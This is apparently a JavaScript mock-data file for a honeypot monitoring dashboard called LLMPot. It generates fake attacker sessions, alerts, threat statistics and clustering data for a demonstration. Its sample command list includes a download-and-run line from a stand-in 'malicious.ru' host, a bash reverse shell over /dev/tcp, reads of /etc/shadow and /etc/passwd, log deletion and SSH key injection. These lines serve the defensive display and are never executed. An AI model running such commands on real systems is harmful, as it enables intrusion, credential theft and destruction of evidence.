/**
 * LLMPot Dashboard — Mock Data Layer
 * Simulates real honeypot session data for demonstration
 */

"use strict";

// ─── Country/flag emoji lookup ────────────────────
const COUNTRY_FLAGS = {
  "China": "🇨🇳", "Russia": "🇷🇺", "USA": "🇺🇸", "Germany": "🇩🇪",
  "Brazil": "🇧🇷", "India": "🇮🇳", "Iran": "🇮🇷", "Vietnam": "🇻🇳",
  "Netherlands": "🇳🇱", "Ukraine": "🇺🇦", "South Korea": "🇰🇷",
  "France": "🇫🇷", "Indonesia": "🇮🇩", "Japan": "🇯🇵", "UK": "🇬🇧",
  "Turkey": "🇹🇷", "Pakistan": "🇵🇰", "Bangladesh": "🇧🇩", "Nigeria": "🇳🇬",
  "Mexico": "🇲🇽", "Romania": "🇷🇴", "Singapore": "🇸🇬", "Hong Kong": "🇭🇰",
};

const COUNTRIES = Object.keys(COUNTRY_FLAGS);

// ─── Geo coords for map markers ───────────────────
const COUNTRY_COORDS = {
  "China": [35.86, 104.19], "Russia": [61.52, 105.31], "USA": [37.09, -95.71],
  "Germany": [51.16, 10.45], "Brazil": [-14.23, -51.92], "India": [20.59, 78.96],
  "Iran": [32.42, 53.68], "Vietnam": [14.05, 108.27], "Netherlands": [52.13, 5.29],
  "Ukraine": [48.37, 31.16], "South Korea": [35.90, 127.76], "France": [46.22, 2.21],
  "Indonesia": [-0.78, 113.92], "Japan": [36.20, 138.25], "UK": [55.37, -3.44],
  "Turkey": [38.96, 35.24], "Pakistan": [30.37, 69.34], "Bangladesh": [23.68, 90.35],
  "Nigeria": [9.08, 8.67], "Mexico": [23.63, -102.55], "Romania": [45.94, 24.96],
  "Singapore": [1.35, 103.81], "Hong Kong": [22.39, 114.10],
};

// ─── Common attack usernames & commands ──────────────
const USERNAMES = [
  "root", "admin", "ubuntu", "user", "test", "pi", "oracle", "postgres",
  "ftpuser", "deploy", "git", "www-data", "mysql", "hadoop", "ec2-user",
];

const COMMANDS = [
  "cat /etc/passwd", "wget http://malicious.ru/bot.sh -O /tmp/x && chmod +x /tmp/x && /tmp/x",
  "uname -a", "id", "whoami", "ls /", "ls -la /home", "ps aux",
  "netstat -tulnp", "curl http://icanhazip.com", "history",
  "cat /proc/cpuinfo", "crontab -l", "find / -name '*.pem' 2>/dev/null",
  "ssh-keygen -t rsa", "echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys",
  "python3 -c \"import socket,subprocess,os;...\"", "rm -rf /var/log/*",
  "/bin/bash -i >& /dev/tcp/185.234.xxx.xxx/4444 0>&1",
  "chmod 777 /etc/passwd", "apt-get install -y nmap",
  "nmap -sV 192.168.1.0/24", "cat /etc/shadow", "sudo su -",
];

const THREAT_LEVELS = ["low", "medium", "high", "critical"];
const THREAT_COLORS = { low: "#10B981", medium: "#F59E0B", high: "#F97316", critical: "#EF4444" };

const CLUSTER_TYPES = ["scout", "brute_forcer", "malware_dropper", "data_exfiltrator"];
const CLUSTER_COLORS = ["#3B82F6", "#8B5CF6", "#EF4444", "#F59E0B"];
const CLUSTER_DESCS = [
  "Quick reconnaissance, minimal commands",
  "Repeated login attempts, dictionary attacks",
  "Downloads & executes remote payloads",
  "Reads sensitive files & environment data",
];

// ─── Utilities ────────────────────────────────────
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomFrom(arr) { return arr[randomInt(0, arr.length - 1)]; }
function randomIP() {
  const prefixes = ["185.220", "45.142", "103.56", "194.165", "23.129", "198.51", "91.108", "5.188"];
  return `${randomFrom(prefixes)}.${randomInt(1,254)}.${randomInt(1,254)}`;
}
function timeAgo(minutes) {
  if (minutes < 1) return "just now";
  if (minutes < 60) return `${Math.round(minutes)}m ago`;
  const h = Math.floor(minutes / 60);
  if (h < 24) return `${h}h ago`;
  return `${Math.floor(h / 24)}d ago`;
}
function formatTime(d) {
  return d.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
}
function formatDateTime(d) {
  return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) + ' ' + formatTime(d);
}

// ─── Generate Sessions ────────────────────────────
function generateSessions(count = 247) {
  const sessions = [];
  const now = Date.now();
  for (let i = 0; i < count; i++) {
    const country = randomFrom(COUNTRIES);
    const minsAgo = randomInt(0, 10080); // up to 7 days
    const timestamp = new Date(now - minsAgo * 60 * 1000);
    const threat = randomFrom(THREAT_LEVELS);
    const status = Math.random() > 0.4 ? (Math.random() > 0.5 ? "success" : "failed") : "active";
    sessions.push({
      id: `sess_${String(i).padStart(4, '0')}`,
      ip: randomIP(),
      country,
      flag: COUNTRY_FLAGS[country] || "🌍",
      coords: COUNTRY_COORDS[country] || [0, 0],
      username: randomFrom(USERNAMES),
      password: randomFrom(["123456", "admin", "password", "root", "toor", "letmein", "qwerty"]),
      command: randomFrom(COMMANDS),
      commandCount: randomInt(1, 45),
      status,
      threat,
      timestamp,
      minsAgo,
      cluster: randomInt(0, 3),
      sessionDuration: randomInt(5, 600),
    });
  }
  // Sort by newest first
  return sessions.sort((a, b) => b.timestamp - a.timestamp);
}

// ─── Generate attack trend data ───────────────────
function generateTrendData(days = 7) {
  const labels = [];
  const data = [];
  const now = new Date();
  for (let i = days; i >= 0; i--) {
    const d = new Date(now);
    d.setDate(d.getDate() - i);
    labels.push(d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
    // Simulate realistic attack pattern with peaks
    const base = randomInt(800, 2000);
    const spike = Math.random() > 0.8 ? randomInt(1500, 4000) : 0;
    data.push(base + spike);
  }
  return { labels, data };
}

function generateTrendData30(days = 30) {
  const labels = [];
  const data = [];
  const now = new Date();
  for (let i = days; i >= 0; i--) {
    const d = new Date(now);
    d.setDate(d.getDate() - i);
    labels.push(d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
    data.push(randomInt(600, 3500));
  }
  return { labels, data };
}

// ─── Alerts data ──────────────────────────────────
const ALERTS_DATA = [
  { sev: "critical", title: "Rootkit Download Detected", desc: "185.220.101.47 — wget to /tmp executed", time: "just now", icon: "shield-x" },
  { sev: "critical", title: "Credential Stuffing Wave", desc: "23 IPs from China attempting root login", time: "2m ago", icon: "key-round" },
  { sev: "warning", title: "Unusual Command Sequence", desc: "Session sess_0041 reading /etc/shadow", time: "5m ago", icon: "alert-triangle" },
  { sev: "warning", title: "Reverse Shell Attempt", desc: "103.56.14.22 → /dev/tcp/185.234.x.x", time: "8m ago", icon: "terminal" },
  { sev: "safe", title: "Brute Force Blocked", desc: "45.142.212.15 exceeded retry limit", time: "12m ago", icon: "shield-check" },
  { sev: "critical", title: "Crontab Modification", desc: "Attacker added persistence backdoor", time: "15m ago", icon: "clock" },
  { sev: "warning", title: "SSH Key Injection", desc: "Unauthorized public key added to authorized_keys", time: "22m ago", icon: "key" },
  { sev: "safe", title: "Honeypot Probe", desc: "91.108.4.77 — single uname -a, disconnected", time: "34m ago", icon: "eye" },
];

// ─── Notifications data ───────────────────────────
const NOTIFICATIONS_DATA = [
  { type: "red", icon: "shield-x", title: "Critical Alert", text: "Rootkit download on session sess_0041", time: "just now" },
  { type: "red", icon: "zap", title: "Attack Spike", text: "+340% attack volume in last 10 minutes", time: "3m ago" },
  { type: "yellow", icon: "alert-triangle", title: "Warning", text: "New attack pattern detected from Russia", time: "7m ago" },
  { type: "blue", icon: "brain-circuit", title: "ML Update", text: "K-Means model retrained with 89 new sessions", time: "1h ago" },
  { type: "yellow", icon: "clock", title: "Session Timeout", text: "6 sessions auto-terminated after 10 min", time: "2h ago" },
];

// ─── Threat page data ─────────────────────────────
const TOP_VECTORS = {
  labels: ["Brute Force", "Exploit Attempt", "Reconn", "Malware Drop", "Backdoor", "Exfiltration"],
  data: [8432, 5211, 3890, 2145, 1876, 987],
};

const TOP_COUNTRIES = [
  { name: "China", count: "9,412", pct: 100, flag: "🇨🇳" },
  { name: "Russia", count: "4,891", pct: 52, flag: "🇷🇺" },
  { name: "Iran", count: "2,341", pct: 25, flag: "🇮🇷" },
  { name: "Vietnam", count: "1,923", pct: 20, flag: "🇻🇳" },
  { name: "Ukraine", count: "1,456", pct: 15, flag: "🇺🇦" },
  { name: "Netherlands", count: "1,102", pct: 12, flag: "🇳🇱" },
  { name: "Brasil", count: "891", pct: 9, flag: "🇧🇷" },
  { name: "USA", count: "712", pct: 8, flag: "🇺🇸" },
];

// ─── K-Means cluster data ─────────────────────────
const CLUSTER_DATA = {
  counts: [412, 287, 183, 94],
  scatter: (() => {
    const pts = [];
    const centers = [[1, 2], [4, 6], [8, 3], [6, 9]];
    const colors = CLUSTER_COLORS;
    centers.forEach(([cx, cy], ci) => {
      const n = [40, 30, 20, 10][ci];
      for (let i = 0; i < n; i++) {
        pts.push({
          x: cx + (Math.random() - 0.5) * 3,
          y: cy + (Math.random() - 0.5) * 3,
          cluster: ci,
          color: colors[ci],
        });
      }
    });
    return pts;
  })()
};

// ─── Suspicious sessions ──────────────────────────
const SUSPICIOUS_SESSIONS = [
  { ip: "185.220.101.47", desc: "Cluster 2 (Malware Dropper) + 12 commands in 45s", score: 98 },
  { ip: "103.56.14.22", desc: "Reverse shell attempt detected by NLP analysis", score: 95 },
  { ip: "45.142.212.15", desc: "823 login attempts — classic brute force pattern", score: 91 },
  { ip: "91.108.4.174", desc: "File exfiltration sequence (passwd, shadow, env)", score: 88 },
  { ip: "194.165.16.73", desc: "SSH key injection + crontab persistence", score: 84 },
  { ip: "23.129.64.180", desc: "Anomaly: outlier in feature space (distance 4.2σ)", score: 79 },
];

// ─── Export singleton ─────────────────────────────
window.LLMPOT_DATA = {
  sessions: generateSessions(247),
  trendData: { "7d": generateTrendData(7), "30d": generateTrendData30(30), "90d": generateTrendData30(90) },
  alerts: ALERTS_DATA,
  notifications: NOTIFICATIONS_DATA,
  topVectors: TOP_VECTORS,
  topCountries: TOP_COUNTRIES,
  clusters: CLUSTER_DATA,
  suspicious: SUSPICIOUS_SESSIONS,
  clusterTypes: CLUSTER_TYPES,
  clusterColors: CLUSTER_COLORS,
  clusterDescs: CLUSTER_DESCS,
  threatColors: THREAT_COLORS,
  countryCoords: COUNTRY_COORDS,
  countryFlags: COUNTRY_FLAGS,
  randomInt, randomFrom, randomIP, timeAgo, formatDateTime,
};
